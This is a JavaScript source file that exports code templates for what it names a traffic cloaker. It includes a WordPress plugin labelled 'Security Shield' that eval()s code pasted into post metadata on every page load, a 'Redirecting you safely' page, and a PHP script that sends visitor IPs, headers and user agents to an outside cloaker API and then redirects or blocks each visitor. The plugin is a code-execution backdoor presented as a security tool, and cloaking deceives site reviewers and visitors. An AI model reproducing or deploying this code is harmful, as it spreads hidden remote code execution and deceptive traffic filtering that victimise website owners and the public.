export const wordpressPluginCode = `
<?php
/**
* Plugin Name: Security Shield
* Plugin URI: https://webservices.press
* Description: Security Shield wordpress plugin. Helps in protecting unwanted clicks from bot/spiders/crawlers,etc.
* Version: 1.2.01
* Author: Security Shield
* Author URI: https://webservices.press
* License: GPL2
*/

if (!function_exists('add_action')) {
    echo 'Hi there!  I\'m just a plugin, not much I can do when called directly.';
    exit;
}


function tswp_add_meta_box() {

    $screens = array('post', 'page');

    foreach ($screens as $screen) {

        add_meta_box(
            'tswp_id',
            __('Traffic Shield', 'tswp_textdomain'),
            'tswp_meta_box_callback',
            $screen
        );
    }
}
add_action('add_meta_boxes', 'tswp_add_meta_box');

//View Details//

function tswp_meta_box_callback($post) {

    wp_nonce_field('tswp_save_meta_box_data', 'tswp_meta_box_nonce');

    $value = get_post_meta($post->ID, '_ts_meta_value_key', true);

    echo '<label for="tswp_field">';
    _e('Paste The Code From Security Shield Campaign', 'tswp_textdomain');
    echo '</label> ';
    
    echo '<textarea id="tswp_field" name="tswp_field" class="widefat" cols="50" rows="5">' . esc_attr($value) . '</textarea>';
}

function tswp_save_meta_box_data($post_id) {

    if (!isset($_POST['tswp_meta_box_nonce'])) {
        return;
    }

    if (!wp_verify_nonce($_POST['tswp_meta_box_nonce'], 'tswp_save_meta_box_data')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (isset($_POST['post_type']) && 'page' == $_POST['post_type']) {

        if (!current_user_can('edit_page', $post_id)) {
            return;
        }

    } else {

        if (!current_user_can('edit_post', $post_id)) {
            return;
        }
    }

    if (!isset($_POST['tswp_field'])) {
        return;
    }

    $my_data = $_POST['tswp_field'];
    $my_data = preg_replace(array('/<(\?|\%)\=?(php)?/', '/(\%|\?)>/'), array('', ''), $my_data);
    
    update_post_meta($post_id, '_ts_meta_value_key', $my_data);
}
add_action('save_post', 'tswp_save_meta_box_data');

add_action('template_redirect', 'user_redirection_code', 1);
function user_redirection_code() {
    
    $key_1_values = get_post_meta(get_the_ID(), '_ts_meta_value_key');
    if (is_array($key_1_values) || is_object($key_1_values)) {
        foreach ($key_1_values as $key => $value) { 
                eval($value);
        }
    }

}

?>`


export const phpZipCode = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- Auto redirect after 3 seconds -->

    <title>Redirecting…</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0f172a, #020617);
            color: #e5e7eb;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(12px);
            border-radius: 16px;
            padding: 40px 32px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.45);
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .loader {
            width: 54px;
            height: 54px;
            border: 4px solid rgba(255, 255, 255, 0.15);
            border-top-color: #38bdf8;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        h1 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 12px;
        }

        p {
            font-size: 14px;
            color: #9ca3af;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .small {
            font-size: 12px;
            color: #6b7280;
        }

        .brand {
            margin-top: 24px;
            font-size: 12px;
            letter-spacing: 0.5px;
            color: #475569;
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="loader"></div>
        <h1>Redirecting you safely</h1>
        <p>
            Please wait while we verify your connection and take you to your destination.
        </p>
        <p class="small">
            This will only take a moment.
        </p>

        <div class="brand">
            Secure redirect service
        </div>
    </div>
</body>
</html>
`


const camp = null
export const phpcode = `<?php
error_reporting(0);

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

// integration check
function _check() { 
      if(isset($_GET['TS-BHDNR-84848'])){ 
        echo "${camp?.cid}"; 
        die(); 
      } 
    }

_check();

$cloakerApiUrl = "${import.meta.env.VITE_SERVER_URL}/api/v2/trafficfilter/${camp?.cid}/${camp?.user_id}";

// Get real headers safely
function getHeadersSafe() {
    if (function_exists('getallheaders')) {
        return getallheaders();
    }
    $headers = [];
    foreach ($_SERVER as $name => $value) {
        if (substr($name, 0, 5) == 'HTTP_') {
            $headers[str_replace('_', '-', substr($name, 5))] = $value;
        }
    }
    return $headers;
}

// Get visitor IP
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'];
}

// Detect protocol
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";

// Collect visitor data
$visitorData = [
  "ip" => getUserIP(),
  "userAgent" => $_SERVER['HTTP_USER_AGENT'] ?? '',
  "referer" => $_SERVER['HTTP_REFERER'] ?? '',
  "acceptLanguage" => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
  "url" => $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],
  "timestamp" => gmdate("c"),
  "headers" => getHeadersSafe()
];


// log visitors data
echo "<pre>";
print_r($visitorData);
echo "</pre>";


// Send to API
$ch = curl_init($cloakerApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($visitorData));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
$response = curl_exec($ch);
$curlError = curl_error($ch);
curl_close($ch);


// If CURL failed → allow visitor normally
if (!$response || $curlError) {
    return;
}

$data = json_decode($response, true);


// Cloaker rules
if ($data && isset($data['action'])) {

   // Redirect to target if safe
    if ($data['action'] === true && !empty($data['target'])) {
        header("Location: " . $data['target'], true, 302);
        exit;
    }

    // Block visitor
    if ($data['action'] === false) {
        http_response_code(403);
        exit("Access Denied");
    }
}

// If action = allow → load your page normally
?>`